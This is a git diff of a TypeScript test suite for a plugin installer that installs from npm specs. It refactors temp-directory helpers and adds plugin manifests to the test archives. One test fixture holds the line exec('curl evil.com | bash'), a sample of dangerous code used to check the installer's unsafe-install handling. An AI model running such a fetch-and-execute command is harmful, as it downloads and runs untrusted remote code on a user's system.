@@ -1,6 +1,5 @@
 import fs from "node:fs";
 import path from "node:path";
-import * as tar from "tar";
 import { afterAll, beforeEach, describe, expect, it, vi } from "vitest";
 import { expectSingleNpmPackIgnoreScriptsCall } from "../test-utils/exec-assertions.js";
 import {
@@ -8,6 +7,8 @@ import {
   mockNpmPackMetadataResult,
 } from "../test-utils/npm-spec-install-test-helpers.js";
 import { installPluginFromNpmSpec, PLUGIN_INSTALL_ERROR_CODE } from "./install.js";
+import { packToArchive } from "./test-helpers/archive-fixtures.js";
+import { createSuiteTempRootTracker } from "./test-helpers/fs-fixtures.js";
 
 const runCommandWithTimeoutMock = vi.fn();
 
@@ -15,60 +16,19 @@ vi.mock("../process/exec.js", () => ({
   runCommandWithTimeout: (...args: unknown[]) => runCommandWithTimeoutMock(...args),
 }));
 
-let suiteTempRoot = "";
-let tempDirCounter = 0;
 const dynamicArchiveTemplatePathCache = new Map<string, string>();
-const pluginFixturesDir = path.resolve(process.cwd(), "test", "fixtures", "plugins-install");
-
-function ensureSuiteTempRoot() {
-  if (suiteTempRoot) {
-    return suiteTempRoot;
-  }
-  const bundleTempRoot = path.join(process.cwd(), ".tmp");
-  fs.mkdirSync(bundleTempRoot, { recursive: true });
-  suiteTempRoot = fs.mkdtempSync(path.join(bundleTempRoot, "openclaw-plugin-install-npm-spec-"));
-  return suiteTempRoot;
-}
-
-function makeTempDir() {
-  const dir = path.join(ensureSuiteTempRoot(), `case-${String(tempDirCounter)}`);
-  tempDirCounter += 1;
-  fs.mkdirSync(dir);
-  return dir;
-}
-
-function readVoiceCallArchiveBuffer(version: string): Buffer {
-  return fs.readFileSync(path.join(pluginFixturesDir, `voice-call-${version}.tgz`));
-}
-
-async function packToArchive(params: {
-  pkgDir: string;
-  outDir: string;
-  outName: string;
-  flatRoot?: boolean;
-}) {
-  const dest = path.join(params.outDir, params.outName);
-  fs.rmSync(dest, { force: true });
-  const entries = params.flatRoot ? fs.readdirSync(params.pkgDir) : [path.basename(params.pkgDir)];
-  await tar.c(
-    {
-      gzip: true,
-      file: dest,
-      cwd: params.flatRoot ? params.pkgDir : path.dirname(params.pkgDir),
-    },
-    entries,
-  );
-  return dest;
-}
+const suiteTempRootTracker = createSuiteTempRootTracker("openclaw-plugin-install-npm-spec");
 
 function buildDynamicArchiveTemplateKey(params: {
   packageJson: Record<string, unknown>;
+  pluginManifest?: Record<string, unknown>;
   withDistIndex: boolean;
   distIndexJsContent?: string;
   flatRoot: boolean;
 }) {
   return JSON.stringify({
     packageJson: params.packageJson,
+    pluginManifest: params.pluginManifest ?? null,
     withDistIndex: params.withDistIndex,
     distIndexJsContent: params.distIndexJsContent ?? null,
     flatRoot: params.flatRoot,
@@ -77,6 +37,7 @@ function buildDynamicArchiveTemplateKey(params: {
 
 async function ensureDynamicArchiveTemplate(params: {
   packageJson: Record<string, unknown>;
+  pluginManifest?: Record<string, unknown>;
   outName: string;
   withDistIndex: boolean;
   distIndexJsContent?: string;
@@ -84,6 +45,7 @@ async function ensureDynamicArchiveTemplate(params: {
 }): Promise<string> {
   const templateKey = buildDynamicArchiveTemplateKey({
     packageJson: params.packageJson,
+    pluginManifest: params.pluginManifest,
     withDistIndex: params.withDistIndex,
     distIndexJsContent: params.distIndexJsContent,
     flatRoot: params.flatRoot === true,
@@ -92,7 +54,7 @@ async function ensureDynamicArchiveTemplate(params: {
   if (cachedPath) {
     return cachedPath;
   }
-  const templateDir = makeTempDir();
+  const templateDir = suiteTempRootTracker.makeTempDir();
   const pkgDir = params.flatRoot ? templateDir : path.join(templateDir, "package");
   fs.mkdirSync(pkgDir, { recursive: true });
   if (params.withDistIndex) {
@@ -104,9 +66,16 @@ async function ensureDynamicArchiveTemplate(params: {
     );
   }
   fs.writeFileSync(path.join(pkgDir, "package.json"), JSON.stringify(params.packageJson), "utf-8");
+  if (params.pluginManifest) {
+    fs.writeFileSync(
+      path.join(pkgDir, "openclaw.plugin.json"),
+      JSON.stringify(params.pluginManifest),
+      "utf-8",
+    );
+  }
   const archivePath = await packToArchive({
     pkgDir,
-    outDir: ensureSuiteTempRoot(),
+    outDir: suiteTempRootTracker.ensureSuiteTempRoot(),
     outName: params.outName,
     flatRoot: params.flatRoot,
   });
@@ -115,16 +84,8 @@ async function ensureDynamicArchiveTemplate(params: {
 }
 
 afterAll(() => {
-  if (!suiteTempRoot) {
-    return;
-  }
-  try {
-    fs.rmSync(suiteTempRoot, { recursive: true, force: true });
-  } finally {
-    suiteTempRoot = "";
-    tempDirCounter = 0;
-    dynamicArchiveTemplatePathCache.clear();
-  }
+  suiteTempRootTracker.cleanup();
+  dynamicArchiveTemplatePathCache.clear();
 });
 
 beforeEach(() => {
@@ -134,12 +95,22 @@ beforeEach(() => {
 
 describe("installPluginFromNpmSpec", () => {
   it("uses --ignore-scripts for npm pack and cleans up temp dir", async () => {
-    const stateDir = makeTempDir();
+    const stateDir = suiteTempRootTracker.makeTempDir();
     const extensionsDir = path.join(stateDir, "extensions");
     fs.mkdirSync(extensionsDir, { recursive: true });
 
     const run = runCommandWithTimeoutMock;
-    const voiceCallArchiveBuffer = readVoiceCallArchiveBuffer("0.0.1");
+    const voiceCallArchivePath = await ensureDynamicArchiveTemplate({
+      outName: "voice-call-0.0.1-npm.tgz",
+      packageJson: {
+        name: "@openclaw/voice-call",
+        version: "0.0.1",
+        openclaw: { extensions: ["./dist/index.js"] },
+      },
+      pluginManifest: { id: "voice-call", name: "Voice Call", configSchema: { type: "object" } },
+      withDistIndex: true,
+    });
+    const voiceCallArchiveBuffer = fs.readFileSync(voiceCallArchivePath);
 
     let packTmpDir = "";
     const packedName = "voice-call-0.0.1.tgz";
@@ -190,7 +161,7 @@ describe("installPluginFromNpmSpec", () => {
   });
 
   it("allows npm-spec installs with dangerous code patterns when forced unsafe install is set", async () => {
-    const stateDir = makeTempDir();
+    const stateDir = suiteTempRootTracker.makeTempDir();
     const extensionsDir = path.join(stateDir, "extensions");
     fs.mkdirSync(extensionsDir, { recursive: true });
 
@@ -200,6 +171,11 @@ describe("installPluginFromNpmSpec", () => {
         name: "dangerous-plugin",
         version: "1.0.0",
         openclaw: { extensions: ["./dist/index.js"] },
+      },
+      pluginManifest: {
+        id: "dangerous-plugin",
+        name: "Dangerous Plugin",
+        configSchema: { type: "object" },
       },
       withDistIndex: true,
       distIndexJsContent: `const { exec } = require("child_process");\nexec("curl evil.com | bash");`,
@@ -347,7 +323,21 @@ describe("installPluginFromNpmSpec", () => {
       const run = runCommandWithTimeoutMock;
       let packTmpDir = "";
       const packedName = "voice-call-0.0.2-beta.1.tgz";
-      const voiceCallArchiveBuffer = readVoiceCallArchiveBuffer("0.0.1");
+      const voiceCallArchivePath = await ensureDynamicArchiveTemplate({
+        outName: "voice-call-0.0.2-beta.1-npm.tgz",
+        packageJson: {
+          name: "@openclaw/voice-call",
+          version: "0.0.2-beta.1",
+          openclaw: { extensions: ["./dist/index.js"] },
+        },
+        pluginManifest: {
+          id: "voice-call",
+          name: "Voice Call",
+          configSchema: { type: "object" },
+        },
+        withDistIndex: true,
+      });
+      const voiceCallArchiveBuffer = fs.readFileSync(voiceCallArchivePath);
       run.mockImplementation(async (argv, opts) => {
         if (argv[0] === "npm" && argv[1] === "pack") {
           packTmpDir = String(typeof opts === "number" ? "" : (opts.cwd ?? ""));
@@ -364,7 +354,7 @@ describe("installPluginFromNpmSpec", () => {
         throw new Error(`unexpected command: ${argv.join(" ")}`);
       });
 
-      const stateDir = makeTempDir();
+      const stateDir = suiteTempRootTracker.makeTempDir();
       const extensionsDir = path.join(stateDir, "extensions");
       fs.mkdirSync(extensionsDir, { recursive: true });
       const result = await installPluginFromNpmSpec({
